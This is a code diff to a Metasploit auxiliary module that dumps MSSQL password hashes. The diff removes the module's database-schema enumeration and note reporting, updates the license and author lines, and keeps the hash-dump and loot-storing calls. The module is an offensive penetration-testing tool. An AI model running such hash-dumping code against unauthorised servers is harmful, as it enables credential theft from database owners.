@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -30,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
 				This module also saves information about the server version and
 				table names, which can be used to seed the wordlist.
 			},
-			'Author'         => ['TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Author'         => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
 			'License'        => MSF_LICENSE
 		)
 	end
@@ -48,60 +48,13 @@ class Metasploit3 < Msf::Auxiliary
 		version = mssql_query(mssql_sql_info())[:rows][0][0]
 		version_year = version.split('-')[0].slice(/\d\d\d\d/)
 
-		#Grab all the DB schema and save it as notes
-		mssql_db_names = get_db_names()
-		mssql_schema={}
-		unless mssql_db_names.nil?
-			mssql_db_names.each do |dbname|
-				tmp_tblnames = get_tbl_names(dbname[0])
-				unless tmp_tblnames.nil?
-					mssql_schema[dbname]=[]
-					tmp_tblnames.each{|tblname| mssql_schema[dbname] << tblname[0] unless tblname[0].nil?}
-				end
-			end
-		end
 		mssql_hashes = mssql_hashdump(version_year)
-		report_other_data(mssql_schema,{'InstanceName' => instancename, 'Version' => version} ,version_year)
 		unless mssql_hashes.nil?
 			report_hashes(mssql_hashes,version_year)
 		end
 
 	end
 
-	def report_other_data(mssql_schema,instancename,version_year)
-
-		unless mssql_schema.nil?
-			report_note(
-				:host  => rhost,
-				:type  => "mssql.schema",
-				:data  => mssql_schema,
-				:port  => rport,
-				:proto => 'tcp',
-				:update => :unique_data
-			)
-		end
-
-		unless instancename.nil?
-			report_note(
-				:host  => rhost,
-				:type  => "mssql.instancename",
-				:data  => instancename
-			)
-
-		end
-
-		unless version_year.nil?
-			report_note(
-				:host  => rhost,
-				:type  => "mssql.version_year",
-				:data  => version_year,
-				:port  => rport,
-				:proto => 'tcp',
-				:update => :unique_data
-			)
-		end
-
-	end
 
 	#Stores the grabbed hashes as loot for later cracking
 	#The hash format is slightly different between 2k and 2k5/2k8
@@ -161,20 +114,5 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
-	#Gets all of the Databases on this Instance
-	def get_db_names
-		results = mssql_query(mssql_db_names())[:rows]
-		return results
-	end
-
-	#Gets all the table names for the given DB
-	def get_tbl_names(db_name)
-		results = mssql_query("SELECT name FROM #{db_name}..sysobjects WHERE xtype = 'U'")[:rows]
-		return results
-	end
-
-
-
 
 end
-
